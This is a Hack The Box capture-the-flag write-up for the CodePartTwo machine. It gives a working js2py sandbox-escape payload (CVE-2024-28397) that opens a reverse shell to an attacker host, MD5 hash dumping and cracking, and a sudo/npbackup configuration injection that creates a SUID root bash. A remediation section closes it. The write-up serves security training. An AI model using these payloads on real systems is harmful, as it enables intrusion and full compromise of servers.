# CodePartTwo — Hack The Box

![CodePartTwo](../images/CodePartTwo.png)

**Machine:** CodePartTwo  
**Difficulty:** Easy  
**OS:** Linux  
**Tags:** js2py RCE, CVE-2024-28397, Hash Cracking, Sudo Misconfiguration

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Initial Foothold](#initial-foothold)
5. [Lateral Movement](#lateral-movement)
6. [Privilege Escalation](#privilege-escalation)
7. [Summary of Exploits](#summary-of-exploits)
8. [Remediation](#remediation)
9. [Tools](#tools)

---

## Summary

CodePartTwo is an Easy Linux machine that demonstrates exploitation of a vulnerable js2py library (CVE-2024-28397) leading to remote code execution, weak password hash cracking, and privilege escalation through sudo misconfiguration. The attack chain involves source code disclosure, sandbox escape exploitation, database credential extraction, and configuration file manipulation.

**Attack Path:**  
Web enumeration → Source code disclosure → js2py RCE (CVE-2024-28397) → Database enumeration → Hash cracking → SSH access → Sudo exploitation → Root

---

## Reconnaissance

### Port Scanning

Initial **nmap** scan to discover open ports:

```bash
nmap -sC -sV -p- --min-rate 5000 <TARGET_IP> -oN nmap_scan.txt
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
```

**Key Findings:**
- **SSH (Port 22):** OpenSSH 8.2p1 - No known critical vulnerabilities, potential entry point if credentials found
- **HTTP (Port 8000):** Gunicorn 20.0.4 - Python WSGI HTTP server, likely running a Flask/Django application

---

## Enumeration

### Web Application Analysis

Navigating to `http://<TARGET_IP>:8000` revealed:
- Login page
- Registration functionality
- **"Download App" button** ← Critical finding!

### Source Code Disclosure

Clicking "Download App" provided `app.zip` containing the complete application source code:

```
app/
├── app.py                  # Main application code
├── instance/
│   └── users.db           # SQLite database
├── requirements.txt        # Python dependencies
├── static/
│   ├── css/
│   └── js/
└── templates/
    ├── base.html
    ├── dashboard.html
    ├── index.html
    ├── login.html
    ├── register.html
    └── reviews.html
```

### Dependency Analysis

**requirements.txt contents:**

```
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

🚨 **Critical Finding:** `js2py==0.74` is vulnerable to **CVE-2024-28397** (Sandbox Escape leading to Remote Code Execution)

### Vulnerable Endpoint Discovery

Analyzing `app.py` revealed the vulnerable code path:

```python
import js2py
js2py.disable_pyimport()  # Attempted security measure (insufficient!)

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)  # ← VULNERABLE LINE
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

**Vulnerability Summary:**
- No authentication required
- Accepts arbitrary JavaScript code via POST
- CVE-2024-28397 allows sandbox escape to execute Python code
- Python's `subprocess` module accessible → RCE

---

## Initial Foothold

### CVE-2024-28397: js2py Sandbox Escape

**Vulnerability:** js2py attempts to sandbox JavaScript execution but fails to prevent access to Python's internal object hierarchy.

### Exploitation Process

#### Step 1: Test Endpoint Accessibility

```bash
curl -X POST http://<TARGET_IP>:8000/run_code \
  -H "Content-Type: application/json" \
  -d '{"code": "1 + 1"}'
```

**Response:**
```json
{"result":2}
```

✅ Endpoint is accessible and executing code!

#### Step 2: Craft Reverse Shell Payload

Created `exploit.sh`:

```bash
#!/bin/bash

LHOST="<ATTACKER_IP>"  # Attacker IP
LPORT="6767"
TARGET="http://<TARGET_IP>:8000/run_code"

curl -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  --data-binary @- << 'EOF'
{
  "code": "let cmd = 'bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/6767 0>&1\"'; let getattr = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__; let obj = getattr(getattr, '__class__').__base__; function findpopen(o) { for(let i in o.__subclasses__()) { let item = o.__subclasses__()[i]; if(item.__module__ == 'subprocess' && item.__name__ == 'Popen') { return item; } } } findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();"
}
EOF
```

**Payload Breakdown:**

1. **JavaScript Command:** `bash -c 'bash -i >& /dev/tcp/10.10.14.51/6767 0>&1'`
2. **Sandbox Escape:** Access Python's object hierarchy via `__class__.__base__.__getattribute__`
3. **Find subprocess.Popen:** Recursively search Python's class hierarchy
4. **Execute:** Call Popen with our reverse shell command

#### Step 3: Set Up Listener and Execute

**Terminal 1 (Listener):**
```bash
nc -lvnp 6767
```

**Terminal 2 (Exploit):**
```bash
chmod +x exploit.sh
./exploit.sh
```

**Result:**
```
listening on [any] 6767 ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] [PORT]
app@codeparttwo:~/app$
```

✅ **Shell obtained as user `app`!**

### Shell Upgrade (Optional but Recommended)

```bash
# In reverse shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z

# In local terminal
stty raw -echo; fg

# Back in reverse shell
export TERM=xterm
```

---

## Lateral Movement

### Database Enumeration

Located SQLite database in the application directory:

```bash
app@codeparttwo:~/app/instance$ ls
users.db
```

### Extracting User Credentials

```bash
sqlite3 users.db "SELECT * FROM user;"
```

**Output:**
```
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

**Findings:**
- Two users: `marco` and `app`
- Password hashes appear to be MD5 (32 hex characters, no salt)

### Hash Cracking

**Step 1: Identify Hash Type**

```bash
echo "649c9d65a206a75f5abe509fe128bce5" > hashes.txt
echo "a97588c0e2fa3a024876339e27aeb42e" >> hashes.txt

hashid -m hashes.txt
```

**Result:** MD5 (Hashcat Mode: 0)

**Step 2: Crack with Hashcat**

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Cracked Password:**
```
[REDACTED_HASH]:[REDACTED_PASSWORD]
```

✅ **Credentials:** `marco:[REDACTED_PASSWORD]`

### SSH Access as Marco

```bash
ssh marco@<TARGET_IP>
# Password: [REDACTED]
```

```bash
marco@codeparttwo:~$ cat user.txt
HTB{redacted}
```

🚩 **User Flag Captured!**

---

## Privilege Escalation

### Sudo Enumeration

```bash
marco@codeparttwo:~$ sudo -l
```

**Output:**
```
User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

🚨 **Critical Finding:** Marco can run `npbackup-cli` as root without a password!

### Analyzing npbackup.conf

```bash
marco@codeparttwo:~$ ls -la
-rw-rw-r-- 1 marco marco 2893 Nov  2 07:23 npbackup.conf
```

✅ Configuration file is **writable** by marco!

**Key Configuration Parameter:**

```yaml
groups:
  default_group:
    backup_opts:
      pre_exec_commands: []  # ← Commands executed BEFORE backup runs!
```

### Exploitation Strategy

**Attack Vector:** Inject malicious commands into `pre_exec_commands` that will execute as root when `npbackup-cli` runs with sudo.

**Goal:** Set SUID bit on bash to gain root shell access.

### Privilege Escalation Execution

**Step 1: Modify Configuration**

```bash
sed -i 's/pre_exec_commands: \[\]/pre_exec_commands: ["cp \/bin\/bash \/tmp\/rootbash", "chmod 4755 \/tmp\/rootbash"]/' npbackup.conf
```

**Verify:**
```bash
grep "pre_exec_commands" npbackup.conf
```

**Output:**
```yaml
pre_exec_commands: ["cp /bin/bash /tmp/rootbash", "chmod 4755 /tmp/rootbash"]
```

**Step 2: Execute Backup as Root**

```bash
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b
```

The backup will execute our injected commands as root:
1. Copy `/bin/bash` to `/tmp/rootbash`
2. Set SUID bit (4755) on the copy

**Step 3: Verify SUID Bash**

```bash
ls -la /tmp/rootbash
```

**Output:**
```
-rwsr-xr-x 1 root root 1183448 Nov  2 09:37 /tmp/rootbash
    ^
    └─ SUID bit set! (the 's')
```

**Step 4: Spawn Root Shell**

```bash
/tmp/rootbash -p  # -p flag preserves privileges
```

**Verification:**
```bash
rootbash-5.0# whoami
root

rootbash-5.0# id
uid=1000(marco) gid=1000(marco) euid=0(root) groups=1000(marco),1003(backups)
```

✅ **Effective UID = 0 (root)**

### Capture Root Flag

```bash
rootbash-5.0# cat /root/root.txt
HTB{redacted}
```

🚩 **Root Flag Captured!**

---

## Summary of Exploits

| Stage | Vulnerability | Technique | Result |
|-------|---------------|-----------|--------|
| 1 | Source Code Disclosure | Download App feature | Application source code |
| 2 | CVE-2024-28397 | js2py sandbox escape | Remote code execution |
| 3 | Weak Password Hashing | MD5 hash in database | Credential extraction |
| 4 | Hash Cracking | Dictionary attack | User password |
| 5 | Sudo Misconfiguration | Configuration injection | Root privilege escalation |

---

## Remediation

### Critical Vulnerabilities

1. **CVE-2024-28397 (js2py Sandbox Escape)**
   - **Fix:** Update js2py to a patched version or replace with a safer code execution solution
   - **Mitigation:** Implement input validation, sandboxing, and authentication on the `/run_code` endpoint
   
2. **Weak Password Storage**
   - **Fix:** Use strong hashing algorithms (bcrypt, Argon2) with salts
   - **Never:** Store passwords in MD5 or any fast hashing algorithm

3. **Sudo Misconfiguration**
   - **Fix:** Remove NOPASSWD from sudoers or restrict command parameters
   - **Principle:** Least privilege - don't allow arbitrary config file execution

4. **Writable Configuration Files**
   - **Fix:** Configuration files used by sudo commands should be owned by root and read-only
   - **Permissions:** `-r--r--r-- root root` for config files

### Security Best Practices

| Issue | Recommendation |
|-------|----------------|
| **Exposed Development Services** | Never expose Gunicorn directly; use Nginx/Apache as reverse proxy |
| **Source Code Disclosure** | Don't provide downloadable application source code in production |
| **Authentication** | Implement proper authentication on all sensitive endpoints |
| **Input Validation** | Sanitize and validate all user inputs |
| **Dependency Management** | Regularly audit and update dependencies using tools like `pip-audit` |
| **Configuration Security** | Store sensitive configs outside web root, use environment variables |
| **Privilege Separation** | Run web applications with minimal privileges |

---

## Tools

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `curl` | HTTP request crafting and API testing |
| `sqlite3` | Database querying |
| `hashid` | Hash type identification |
| `hashcat` | Password hash cracking |
| `netcat` | Reverse shell listener |
| `ssh` | Remote access |
| `sed` | Configuration file manipulation |

---

**Author:** Erviano Florentino Susanto  
**Platform:** Hack The Box  
**Date:** Redacted  
**Flags:** User `HTB{redacted}`, Root `HTB{redacted}`

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities.*
